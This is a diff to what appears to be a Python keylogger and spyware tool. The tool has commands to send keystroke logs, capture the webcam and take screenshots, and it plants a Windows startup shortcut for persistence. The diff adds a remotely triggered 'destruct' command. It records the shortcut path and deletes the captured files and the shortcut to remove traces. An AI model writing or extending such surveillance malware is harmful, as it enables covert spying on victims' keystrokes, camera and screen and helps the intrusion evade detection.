@@ -52,11 +52,39 @@ POLL_INTERVAL = 2
 CAM_OUTPUT_FILE = Path("webcam.jpg")
 SS_OUTPUT_FILE  = Path("screenshot.png")
 
+SHORTCUT_PATH=Path("")
+
 log_lock = threading.Lock()
 
 # ── Shared stop event ──────────────────────────────────────────────────────────
 
 stop_event = threading.Event() 
+
+## cleanup
+
+def cleanup():
+    """Delete the output file and the startup shortcut."""
+    print("\n[!] Ctrl+C detected — cleaning up...")
+ 
+    if os.path.exists(OUTPUT_FILE):
+        os.remove(OUTPUT_FILE)
+
+    if os.path.exists(CLIP_OUTPUT_FILE):
+        os.remove(CLIP_OUTPUT_FILE)
+
+    if os.path.exists(CAM_OUTPUT_FILE):
+        os.remove(CAM_OUTPUT_FILE)
+
+    if os.path.exists(SS_OUTPUT_FILE):
+        os.remove(SS_OUTPUT_FILE)
+ 
+    if os.path.exists(SHORTCUT_PATH):
+        os.remove(SHORTCUT_PATH)
+    else:
+        print(f"[~] Shortcut not found (already gone?): {SHORTCUT_PATH}")
+ 
+    print("[✓] Cleanup complete. Goodbye!")
+
 
 # ── Keystroke helpers ──────────────────────────────────────────────────────────
 
@@ -351,6 +379,7 @@ COMMAND_MAP = {
     "log": send_log,
     "cam": capture_webcam,
     "ss":  capture_screenshot,
+    "destruct": cleanup,
 }
 
 ## staruup shortcut for  persistence
@@ -364,7 +393,7 @@ def create_startup_shortcut():
             "    Then re-run this script to create the startup shortcut."
         )
         return
- 
+    global SHORTCUT_PATH
     # Resolve absolute path to this script
     script_path = os.path.abspath(__file__)
  
@@ -375,7 +404,9 @@ def create_startup_shortcut():
     )
  
     shortcut_path = os.path.join(startup_folder, "script.lnk")
- 
+    
+    SHORTCUT_PATH = Path(shortcut_path)
+
     shell = win32com.client.Dispatch("WScript.Shell")
     shortcut = shell.CreateShortcut(shortcut_path)
  
@@ -387,6 +418,7 @@ def create_startup_shortcut():
     shortcut.Save()
  
     print(f"[+] Startup shortcut created:\n    {shortcut_path}")
+
 
 # ── Entry point ────────────────────────────────────────────────────────────────
 
